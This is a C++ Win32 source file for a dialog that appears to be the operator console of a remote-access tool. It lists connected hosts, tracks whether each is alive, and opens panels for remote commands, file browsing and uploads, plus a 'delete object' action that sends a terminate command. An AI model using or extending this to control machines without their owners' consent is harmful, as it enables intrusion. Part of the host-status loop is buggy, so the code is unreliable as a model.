

#include <windows.h>
#include "resource.h"
#include "dialog.h"

#include "packet.h"

#include "command.h"
#include <iostream>

#include <vector>
#include "dlgCmd.h"

#include "mission.h"
#include "dlgFiles.h"
#include "dlgHeartbeat.h"
#include "dlgOnline.h"
#include "dlgUpload.h"
#include "FileHelper.h"
#include "utils.h"


using namespace std;


MyDialog * g_mydialog = 0;


MyDialog::MyDialog() {

}

MyDialog::~MyDialog() {
	if (g_mydialog) {
// 		delete g_mydialog;
// 		g_mydialog = 0;
	}

	KillTimer(0, m_clock);
}


string MyDialog::getFeild(const char * str,const char * key) {
	string strkey = string(key) + ":";
	char* hdr = strstr((char*)str, strkey.c_str());
	if (hdr)
	{
		hdr += strkey.size();

		char* end = strstr(hdr, ",");
		if (end)
		{
			int len = end - hdr;
			string res = string(hdr, len);
			return res;
		}
	}

	return "";
}


void CALLBACK timerProc(HWND hwnd, UINT uMsg, UINT idEvent, DWORD dwTime)
{
	g_mydialog->updateObjects();
}



int MyDialog::menu() {
	HMENU menu = LoadMenuA(0, (LPCSTR)IDR_MENU1);
	SetMenu(m_hwnd, menu);
	return 0;
}


int MyDialog::rmenu() {

	HMENU menu = LoadMenuA(0, (LPCSTR)IDR_MENU1);

	HMENU sub = GetSubMenu(menu, 0);
	RECT rect = { 0 };

	POINT pt;
	GetCursorPos(&pt);
	TrackPopupMenu(sub, TPM_LEFTBUTTON| TPM_TOPALIGN| TPM_LEFTBUTTON, pt.x, pt.y, 0, m_hwnd, 0);
	
	return 0;
}


int dlgListboxProc(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam) {

	if (msg == WM_RBUTTONDOWN) {

		int ret = g_mydialog->rmenu();

		return TRUE;
	}
	return CallWindowProcA(g_mydialog->m_listboxProc, hwnd, msg, wparam, lparam);
}


int __stdcall MyDialog::runDialog(MyDialog* dialog) {
	int ret = 0;

	dialog->m_hwnd = CreateDialogA(dialog->m_hinst, (LPCSTR)IDC_DLG1, 0, (DLGPROC)dlgProc, 0);
	if (dialog->m_hwnd == 0)
	{
		ret = GetLastError();
		return FALSE;
	}

	ret = ShowWindow(dialog->m_hwnd, SW_SHOW);

	HWND hwnd = GetDlgItem(dialog->m_hwnd, IDC_LIST1);

	dialog->m_listboxProc = (WNDPROC)GetWindowLongPtrA(hwnd, GWLP_WNDPROC);

	ret = SetWindowLongPtrA(hwnd, GWLP_WNDPROC,(LONG_PTR)dlgListboxProc);

	ret = SendMessageA(dialog->m_hwnd, WM_COMMAND, CMD_UPDATE_HOSTS, 0);

	MSG msg;
	while ((ret = GetMessage(&msg, 0, 0, 0)) != 0) {

		if (ret == -1) {
			return -1;
		}

		if (!IsDialogMessage(dialog->m_hwnd, &msg))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	delete g_mydialog;
	g_mydialog = 0;
	return 0;
}




INT __stdcall deleteObject(CMD_PARAMS * params) {

	int ret = 0;

	string id = params->id;
	string path = params->cmd;

	delete params;

	ret = MessageBoxA(0, "would u want to delete this object?", "delete object", MB_OKCANCEL);
	if (ret == IDOK)
	{
		PacketParcel packet(TRUE, id);

		int subcmd = COMMAND_TYPE_TERMINATE;
		char* buf = buildCmd((char*)&subcmd , sizeof(int), COMMAND_TYPE_TERMINATE);

		ret = packet.postCmdFile(CMD_BRING_COMMAND, buf, sizeof(int) + sizeof(MY_CMD_PACKET));

		delete buf;

		char* data = packet.getbuf();
		int datasize = packet.getbufsize();
		if (datasize < 4 || *(INT*)data != DATA_PACK_TAG )
		{
			return FALSE;
		}
		return TRUE;
	}
	else if (ret == IDCANCEL)
	{

	}

	return ret;
}


int removeRepitition(vector<CLIENT_INFO> & v) {

	int ll = v.size();
	for (int i = 0;i < ll-1;i ++)
	{
		for (int j = 0;j < ll - 1;j++)
		{
			if (v.size()>= 2 && v[j].host == v[j+1].host)
			{
				v[j + 1].tag = FALSE;
			}
		}
		ll--;
	}

	for (int j = 0; j < v.size(); )
	{
		if (v[j].tag == FALSE)
		{
			v.erase(v.begin() + j);
		}
		else {
			j++;
		}
	}
	
	return 0;
}


int writeObjects(vector<CLIENT_INFO> hosts) {

	int ret = 0;
	char info[1024];
	
	for (int i = 0;i < hosts.size(); i ++)
	{
		string filename = hosts[i].host + "." + LOCAL_OBJECTS_FILENAME;

		int len = wsprintfA(info, OBJECT_INFO_FORAMT, hosts[i].host.c_str(), hosts[i].ip.c_str(), hosts[i].date.c_str());
		lstrcatA(info, "\r\n");
		ret = FileHelper::fileWriter(filename.c_str(), info, len + 2, FILE_WRITE_CHECK);
	}

	return hosts.size();
}


int MyDialog::updateObjects() {

	int ret = 0;

	vector <ONLINE_INFO> onlineList;

	char buffer[0x1000];
	HWND list = GetDlgItem(g_mydialog->m_hwnd, IDC_LIST1);

	DWORD cnt = SendMessage(list, LB_GETCOUNT, 0, 0);
	for (int i = 0; i < cnt; i++)
	{
		ret = SendMessageA(list, LB_GETTEXT, i, (LPARAM)buffer);
		if (ret)
		{
			ONLINE_INFO online_info;
			string id = getFeild(buffer, ONLINE_KEYNAME_ID);
			string ip = getFeild(buffer, ONLINE_KEYNAME_IP);
			string time = getFeild(buffer, ONLINE_KEYNAME_TIME);
			string status = getFeild(buffer, ONLINE_KEYNAME_STATUS);
			online_info.num = i;
			online_info.id = id;
			online_info.ip = ip;
			online_info.time = time;
			online_info.status = status;
			online_info.valid = FALSE;
			onlineList.push_back(online_info);
		}
	}

	PacketParcel packet(TRUE);

	ret = packet.postAllCmd(CMD_GETHOST, GETHOST_ALLH);

	char* data = packet.getbuf();
	int datasize = packet.getbufsize();
	if (datasize <= 8 || *(INT*)data != DATA_PACK_TAG || *(int*)(data + datasize - 4)!= DATA_PACK_TAG)
	{
		char info[1024];
		opLog("all host datasize:%d\r\n", datasize);
		return FALSE;
	}

	vector<CLIENT_INFO>hosts_all = parseHosts(data + 4, datasize - 8);
	removeRepitition(hosts_all);
	writeObjects(hosts_all);

	ret = packet.postAllCmd(CMD_GETHOST, GETHOST_LIVE);
	data = packet.getbuf();
	datasize = packet.getbufsize();
	PACKET_HEADER* hdr = (PACKET_HEADER*)data;
	if (datasize < 4 || *(INT*)data != DATA_PACK_TAG )
	{
		return FALSE;
	}

	vector<CLIENT_INFO>hosts_live = parseHosts(data + 4, datasize-8);
	removeRepitition(hosts_live);
	writeObjects(hosts_live);

	char info[1024];

	for (int j = 0; j < hosts_live.size(); j++)
	{
		for (int i = 0; i < hosts_all.size(); i++)
		{
			if (hosts_live[j].host == hosts_all[i].host)
			{
				hosts_all.erase(hosts_all.begin() + i);

				//hosts_all[i].tag = FALSE;
			}
		}
	}

	for (int j = 0; j < hosts_live.size(); j++)
	{
		int flag = FALSE;
		for (int k = 0; k < onlineList.size(); k++)
		{
			if (hosts_live[j].host == onlineList[k].id)
			{
				onlineList[k].valid = TRUE;

				if (onlineList[k].status == string(ONLINE_KEYVALUE_STATUS_ALIVE))
				{
					//still
				}else if (onlineList[k].status == string(ONLINE_KEYVALUE_STATUS_DEAD))
				{
					wsprintfA(info, ONLINE_FORAMT, hosts_live[j].host.c_str(), hosts_live[j].ip.c_str(),
						hosts_live[j].date.c_str(), ONLINE_KEYVALUE_STATUS_ALIVE);

					ret = SendMessageA(list, LB_DELETESTRING, onlineList[k].num, (LPARAM)0);

					ret = SendMessageA(list, LB_INSERTSTRING, onlineList[k].num, (LPARAM)info);
					//change
				}
				flag = TRUE;
			}
		}

		if (flag == FALSE)
		{
			wsprintfA(info, ONLINE_FORAMT, hosts_live[j].host.c_str(), hosts_live[j].ip.c_str(), hosts_live[j].date.c_str(),
				ONLINE_KEYVALUE_STATUS_ALIVE);
			ret = SendMessageA(list, LB_ADDSTRING, 0, (LPARAM)info);
					
		}	
	}
	

	for (int i = 0; i < hosts_all.size(); i++) {

		int flag = FALSE;
		for (int k = 0; k < onlineList.size(); k++)
		{
			if (hosts_all[i].host == onlineList[k].id)
			{
				onlineList[k].valid = TRUE;
				if (onlineList[k].status == string(ONLINE_KEYVALUE_STATUS_ALIVE))
				{
					wsprintfA(info, ONLINE_FORAMT, hosts_live[i].host.c_str(), hosts_live[i].ip.c_str(),
						hosts_live[i].date.c_str(), ONLINE_KEYVALUE_STATUS_DEAD);

					ret = SendMessageA(list, LB_DELETESTRING, onlineList[k].num, (LPARAM)0);

					ret = SendMessageA(list, LB_INSERTSTRING, onlineList[k].num, (LPARAM)info);
				}
				else if (onlineList[k].status == string(ONLINE_KEYVALUE_STATUS_DEAD))
				{
					//still
				}
				flag = TRUE;
			}
		}

		if (flag == FALSE)
		{
			wsprintfA(info, ONLINE_FORAMT, hosts_all[i].host.c_str(), hosts_all[i].ip.c_str(), hosts_all[i].date.c_str(),
				ONLINE_KEYVALUE_STATUS_DEAD);
			ret = SendMessageA(list, LB_ADDSTRING, 0, (LPARAM)info);
		}
	}

	return ret;
}






INT_PTR MyDialog::dlgProc(HWND hwnd,UINT msg,WPARAM wparam,LPARAM lparam)
{
	char data[0x1000];

	if (msg == WM_INITDIALOG)
	{
		//must be in WM_INITDIALOG or WM_CREATE
		g_mydialog->m_clock = SetTimer(0, 0, HOST_HEARTBEAT_INTERVAL, (TIMERPROC)timerProc);
	}
	else if ((msg&0xffff) == WM_COMMAND)
	{
		int wl = wparam & 0xffff;
		int wh = wparam >> 16;
		int ll = lparam & 0xffff;
		int lh = lparam >> 16;
		if (wl == CMD_UPDATE_HOSTS)
		{
			g_mydialog->updateObjects();
		}
		else if (wparam == IDM_OPER_FILE)
		{

			HWND list = GetDlgItem(g_mydialog->m_hwnd, IDC_LIST1);
			int num = SendMessage(list, LB_GETCURSEL, 0, 0);
			if (num != -1)
			{
				int ret = SendMessageA(list, LB_GETTEXT, num, (LPARAM)data);
				if (ret) {
					string id = g_mydialog->getFeild(data, ONLINE_KEYNAME_ID);
					ret = createDlgFile(g_mydialog->m_hinst, id);
				}
			}
		}
		else if (wparam == IDM_OPER_CMD)
		{

			
			HWND list = GetDlgItem(g_mydialog->m_hwnd, IDC_LIST1);
			DWORD num = SendMessage(list, LB_GETCURSEL, 0, 0);
			if (num != -1) {
				int ret = SendMessageA(list, LB_GETTEXT, num, (LPARAM)data);
				if (ret) {
					string id = g_mydialog->getFeild(data, ONLINE_KEYNAME_ID);
					int ret = createDlgCmd(g_mydialog->m_hinst, id);
				}
			}
		}
		else if (wparam == IDM_FILE_UPLOAD)
		{
			

			HWND list = GetDlgItem(g_mydialog->m_hwnd, IDC_LIST1);
			DWORD num = SendMessage(list, LB_GETCURSEL, 0, 0);
			if (num != -1) {
				int ret = SendMessageA(list, LB_GETTEXT, num, (LPARAM)data);
				if (ret) {
					string id = g_mydialog->getFeild(data, ONLINE_KEYNAME_ID);
					createDlgUpload(g_mydialog->m_hinst, id);
				}
			}
		}
		else if (wparam == IDM_DELETE )
		{

			HWND list = GetDlgItem(g_mydialog->m_hwnd, IDC_LIST1);
			DWORD num = SendMessage(list, LB_GETCURSEL, 0, 0);
			if (num != -1) {
				int ret = SendMessageA(list, LB_GETTEXT, num, (LPARAM)data);
				if (ret) {
					CMD_PARAMS* params = new CMD_PARAMS;
					params->id = g_mydialog->getFeild(data, ONLINE_KEYNAME_ID);
					int ret = deleteObject(params);
				}
			}
		}
		else if (wparam == IDM_ONLINE_INFO)
		{

			HWND list = GetDlgItem(g_mydialog->m_hwnd, IDC_LIST1);
			DWORD num = SendMessage(list, LB_GETCURSEL, 0, 0);
			if (num != -1) {
				int ret = SendMessageA(list, LB_GETTEXT, num, (LPARAM)data);
				if (ret) {
					string id = g_mydialog->getFeild(data, ONLINE_KEYNAME_ID);
					ret = createDlgOnline(g_mydialog->m_hinst, id);
				}
			}
		}
		else if (wparam == IDM_ONLINE_RANDOM)
		{

			HWND list = GetDlgItem(g_mydialog->m_hwnd, IDC_LIST1);
			DWORD num = SendMessage(list, LB_GETCURSEL, 0, 0);
			if (num != -1) {
				int ret = SendMessageA(list, LB_GETTEXT, num, (LPARAM)data);
				if (ret) {
					string id = g_mydialog->getFeild(data, ONLINE_KEYNAME_ID);
					int ret = createDlgHB(g_mydialog->m_hinst, id);
				}
			}
			
		}
		else if ( (wl == IDC_LIST1) && ((wh) == LBN_SELCHANGE))
		{
			//g_mydialog->rmenu();
		}
	}
	else if (msg == WM_SYSCOMMAND)
	{
		int wl = wparam & 0xffff;
		int wh = wparam >> 16;
		int ll = lparam & 0xffff;
		int lh = lparam >> 16;
	}
	else if (msg == WM_CTLCOLORDLG)
	{
		HDC hdc = (HDC) wparam;

		HWND hwnd = (HWND)lparam;

		HWND h = GetDlgItem(g_mydialog->m_hwnd, IDC_LIST1);
		if (h == hwnd)
		{
			int ret = SetTextColor(hdc, 0xff00);
		}
	}
	else if (msg == WM_CLOSE)
	{
		EndDialog(hwnd, 0);
		DestroyWindow(hwnd);
	}
	else if (msg == WM_DESTROY)
	{
		PostQuitMessage(-1);
	}
	else if (msg == WM_CHAR)
	{
		printf("hello");
	}
	else if (msg == WM_RBUTTONDOWN)
	{
		g_mydialog->rmenu();
	}
	else if (msg == WM_LBUTTONDOWN)
	{
		printf("hello");
	}
	else if (msg == WM_PAINT){
// 	PAINTSTRUCT pt;
// 	HDC hdc = BeginPaint(hwnd, &pt);
// 	INT ret = SetTextColor(hdc, 0xff00);
// 	ret = GetLastError();
// 	EndPaint(hwnd, &pt);
	}
	return 0;
}


int createDialog(HINSTANCE hinstance) {
	g_mydialog = new MyDialog();
	g_mydialog->m_hinst = hinstance;

	int ret = g_mydialog->runDialog(g_mydialog);
// 	HANDLE h = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)g_mydialog->runDialog, g_mydialog, 0, 0);
// 	if (h)
// 	{
// 		CloseHandle(h);
// 	}
	return TRUE;
}